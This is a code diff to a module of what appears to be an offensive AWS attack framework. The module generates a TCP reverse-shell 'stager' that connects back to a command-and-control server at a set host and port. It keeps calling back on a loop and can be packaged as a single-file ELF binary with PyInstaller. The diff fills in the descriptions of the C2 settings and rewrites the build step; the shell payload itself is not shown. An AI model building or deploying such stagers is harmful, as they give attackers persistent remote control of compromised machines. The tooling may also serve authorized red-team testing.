@@ -1,7 +1,6 @@
 from termcolor import colored
 import os
 import PyInstaller.__main__
-import nuitka.__main__
 
 author = {
     "name": "gl4ssesbo1",
@@ -21,37 +20,32 @@ variables = {
     "HOST": {
         "value": "",
         "required": "true",
-        "description": "The service that will be used to run the module. It cannot be changed."
+        "description": "The Host/IP of the C2 Server."
     },
     "PORT": {
         "value": "",
         "required": "true",
-        "description": "The service that will be used to run the module. It cannot be changed."
+        "description": "The C2 Server Port."
     },
     "FORMAT": {
         "value": "",
         "required": "true",
-        "description": "The service that will be used to run the module. It cannot be changed."
+        "description": "The format of the stager. Currently only allows 'py' for Python and 'elf' for ELF Binary."
     },
     "CALLBACK-TIME": {
-        "value": "",
+        "value": "None",
         "required": "true",
-        "description": "The service that will be used to run the module. It cannot be changed."
-    },
-    "OBFUSCATED": {
-        "value": "False",
-        "required": "false",
-        "description": "The service that will be used to run the module. It cannot be changed."
+        "description": "The time in seconds between callbacks from Stager. The Stager calls back even if the server crashes or is stoped in a loop."
     },
     "OUTPUT-FILE-NAME": {
         "value": "",
         "required": "true",
-        "description": "The service that will be used to run the module. It cannot be changed."
+        "description": "The name of the stager output file."
     }
 }
-description = "Description of your Module"
+description = "The TCP Reverse Shell that is used by listeners/aws_python_tcp_listener"
 
-aws_command = "aws ec2 describe-launch-templates --region {} --profile {}"
+aws_command = "None"
 
 
 def python_code_generate(host, port, seconds, outfile, dest):
@@ -102,26 +96,28 @@ def exploit(workspace):
         format = variables['FORMAT']['value']
         python_code_generate(host, port, seconds, outputfile, dest)
 
-        if format == 'py':
+        if not format == 'py' and not format == 'elf':
+            print(
+                colored("[*] The FORMAT is either 'py' or 'elf'.", "red")
+            )
+
+        elif format == 'py':
             print(colored("[*] Stager saved on file '{}'.".format(dest), "yellow"))
 
-        if format == 'elf':
+        elif format == 'elf':
             distdir = "{}/dist".format(dir)
             builddir = "{}/build".format(dir)
-            nuitka.__main__.main(
 
+            PyInstaller.__main__.run(
+                [
+                    '--distpath',
+                    distdir,
+                    '--workpath',
+                    builddir,
+                    '--onefile',
+                    '--windowed',
+                    dest
+                ]
             )
-            ''
-			PyInstaller.__main__.run(
-				[
-					'--distpath',
-					distdir,
-					'--workpath',
-					builddir,
-					'--onefile',
-					'--windowed',
-					dest
-				]
-			)
-			'''
+
             print(colored("[*] Stager saved on file '{}'.".format(distdir), "yellow"))
